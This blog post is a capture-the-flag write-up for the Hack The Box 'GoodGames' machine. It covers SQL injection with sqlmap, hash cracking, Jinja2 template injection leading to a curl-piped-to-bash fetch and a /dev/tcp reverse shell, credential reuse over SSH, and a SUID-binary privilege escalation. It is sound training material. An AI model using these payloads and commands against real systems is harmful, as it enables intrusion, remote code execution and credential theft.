---
layout: post
title:  "GoodGames Writeup"
name: "goodgames"
date:   2023-03-24 07:44
author: "soh3ee"
categories: writeups
--- 
{% assign image_path = site.data.categories[0].image_path %}
# Reconnaissance

```shell
nmap -p- -sCV -o goodgames.txt --min-rate=10000 10.10.11.130
Warning: 10.10.11.130 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.130
Host is up (0.086s latency).
Not shown: 64418 closed tcp ports (conn-refused), 1116 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 21 15:46:24 2023 -- 1 IP address (1 host up) scanned in 27.49 seconds
```
## Initial Access
![]({{ image_path }}{{ page.name }}/img1.png)
The only port that was open was port 80, which is used for web services (`http`). I visited the website and traversed through the site, to see if there was any particular infomrat

`Nmap` identified some information about the technology the site was using: Werkezeug/2.0.2 Python/3.9.2. The version number itself, along with the name of technology caught my eyes-- I searched for "Werkzeug 2.0.2 exploits". Looking at HackTricks, it seemed that if debug was enabled, there could be a URI to the console at the `/console` endpoint. I hoped that this would be my initial access, but unfortunately I received a 404 error.

Moving on, I traversed through the site and analyzed the requests the site was sending using Burpsuite. This didn't result to much, as everything seemed normal. Eventually, I withdrew myself to the login page, in which I came to my last resort: SQL injection. SQL injections are always a possibility with login pages, but I like looking around first before I result to bruteforce options. I used burpsuite to confirm the URI path and data parameters:

![]({{ image_path }}{{ page.name }}/burpsuite.png)

### Sqlmap Payload
``` shell
sqlmap -u 'http://goodgames.htb/login' --data="email=test@gmail.com&password=test" --level 5 --risk 3 -f --banner │ --ignore-code 401
```
``` sql
sqlmap identified the following injection point(s) with a total of 235 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: email=test@gmail.com' OR NOT 9443=9443-- ivUO&password=test

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@gmail.com' AND (SELECT 7414 FROM (SELECT(SLEEP(5)))yOWp)-- sdlr&password=test

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: email=test@gmail.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a787071,0x4e5a62544f6d427a58487362544646664f4e766361584b755948474e6a63426d494f474b744c736d,0x716b707171)-- -&password=test
---
[21:45:25] [INFO] testing MySQL
[21:45:26] [INFO] confirming MySQL
[21:45:26] [INFO] the back-end DBMS is MySQL
[21:45:26] [INFO] fetching banner
[21:45:27] [INFO] executing MySQL comment injection fingerprint
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.27
banner: '8.0.27'
[21:45:27] [INFO] fetched data logged to text files under '/home/sohee/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 21:45:27 /2023-03-22/

```
The `sqlmap` attack was successful. To then access the database, I passed the `--dump` flag to the same command like so: 
``` shell
sqlmap -u 'http://goodgames.htb/login' --data="email=test@gmail.com&password=test" --level 5 --risk 3 -f --banner │ --ignore-code 401 --dump
```
``` sql
Database: main
Table: user
[1 entry]
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+
```
Creds <3 But I noticed the password was hashed, although it was just a simple MD5 hash. One could pass this hash into a hash cracker like CyberChef and used the "Magic" option to discover the type of hash, but I was able to recognize it and passed it into Crackstation.

![]({{ image_path }}{{ page.name }}/crackstation.png)

## Initial Access
Using these creds, I logged in to the login page I attacked. After clicking around the new portal, I noticed that one of the links (the gear icon) took me to a new vhost: `internal-administration.goodgames.htb`.

![]({{ image_path }}{{ page.name }}/gearicon.png) 

![]({{ image_path }}{{ page.name }}/vhost.png)

I added it to my `/etc/hosts` and arrived at another login portal. The first thing I noticed was that this login portal expected different types of credentials. The previous one had been an email, but this one expected a username. Before doing any more deep diving, I tried the same credentials, but in the username, I removed the domain.

![]({{ image_path }}{{ page.name }}/flasklogincreds.png)

### SSTI in Flask/Jinja
More than specifically seeing any potential on this "General Information" page, I used process of elimination, as the other links or buttons had no meaningful action. 
*I often look for keywords that hint at names of technologies and even their versions*
On top of the fact that I could probably exploit the input boxes, I also saw "Flask Volt Dashboard" in the order of the page. So I searched: "Flask Volt Dashboard exploit".

![]({{ image_path }}{{ page.name }}/dashboard.png)

I came across this post: https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
Reading this post made me understand that I could possibly exploit a template that directly called data from a database. Therefore rather than passing the expected data, in this case, a "Full Name", I could pass data in Jinja's syntax, that would execute as my payload.

So I tried it:

![]({{ image_path }}{{ page.name }}/flasklogincreds.png)

And wah-lah, it worked :P! After having POC (Proof of Concept), I used the following exploit to obtain RCE (Remote Code Execution), that would grab a file containing commands for a reverse shell from my attacking machine.
1. Configure the revshell executable to be grabbed: 
    - Create a file called `revshell`
    - Populate with: 
    ```
    #!/bin/bash
    -c "bash -i >& /dev/tcp/10.10.14.22/6666 0>&1"
    ```
2. Set up the listener: `nc -lvnp 6666`
3. Set up the web server: `python3 -m http.server 80`
4. Submit the request with the payload as the "Full Name": `{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.22/revshell | bash').read()}}`

And there was my shell! But ew, what the fudge, it looks like I'm in a container ):

![]({{ image_path }}{{ page.name }}/container.png)


### Escaping the Container
The first thing I did was look around the container. I had landed in `/backend/` when I initiated the shell. I looked around but never found anything actually important.

I then progressed to `linpeas`. Although it wasn't highlighted, I notice that there was a user in the home directory?! 

![]({{ image_path }}{{ page.name }}/augustus.png)

I was able to read `user.txt`, but the thing I was more concerned about was how `/home/augustus` existed without being a defined uesr in `/etc/passwd` **in the container**.
`cat /etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

After looking more into containers, I learned that host machines can mount their directories to the container. Although I couldn't yet do anything with this information yet, it would come in handy down the line.

This was my first time having to break out of a container, so Brice told me a bit of information regarding Docker containers and the connection between it and the host machine:
    - The host machine behaves as a gateway between the docker container and itself, therefore the default gateway of the network is a vector in which we can communicate from the container to the host (using 172.19.0.1)

Using this information, I imported an `nmap` binary from my host machine to the container and scanned the host machine. 
*Make sure you are in a writeable directory, and to give the executable the correct permissions (`chmod +x`)*
`./nmap -p- 172.19.0.1 --minrate=5000`
```
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-23 07:49 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.19.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:3B:D3:F2:F7 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 34.58 seconds
```

At this moment is when I should have put the three pieces together: I **assumed** user `augustus` existed on the host machine because it was **likely** mounted, as it did not appear to exist in `/etc/passwd`, I had some creds, and `ssh` was open!

After more useless rummaging on the container, I eventually said "what if I just try the same creds, but with the user `augustus`?

And this is when I had my biggest takeway from this box. No matter how much you might think "there's no way it's the same creds AGAIN", try, because you really never know.
```
ssh augustus@172.19.0.1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
```
LOL, you gotta get an interactive shell first x_x
My usual go-to command for that is: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
Finally:
``` 
ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: superadministrator 

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ 
```

## Privilege Escalation
Looking at the output of `ps aux`, I noticed something a bit suspicious. Although I wasn't entirely familiar with how Docker containers functioned in correlation with their host machines, I knew this was odd. All the commands being run on the container were being run as `root` on the host machine!

![]({{ image_path }}{{ page.name }}/everythingroot.png)

It's a bit hard to see, but the Python interactive shell command I just ran is being run as `root`. Knowing this, my thought and step process was the following:
1. Go back into the container
{: .numbered-list }

{:start="2"}
2. Copy a `cat` binary into the mounted user `augustus` directory which would be owned by `root`
{: .numbered-list }
`cp /usr/bin cat`

![]({{ image_path }}{{ page.name }}/catbinary.png)

{:start="3"}
3. Set the SUID 
Set the SUID on the binary to allow execution as `root` despite not being `root`
{: .numbered-list }
`chmod +s cat`

![]({{ image_path }}{{ page.name }}/catbinary.png)

{:start="4"}
4. SSH 
SSH in back into the host machine and read `/root/root.txt` **with the mounted `cat` binary**
`/home/augustus/cat /root/root.txt`
{: .numbered-list }

![]({{ image_path }}{{ page.name }}/root.png)












     
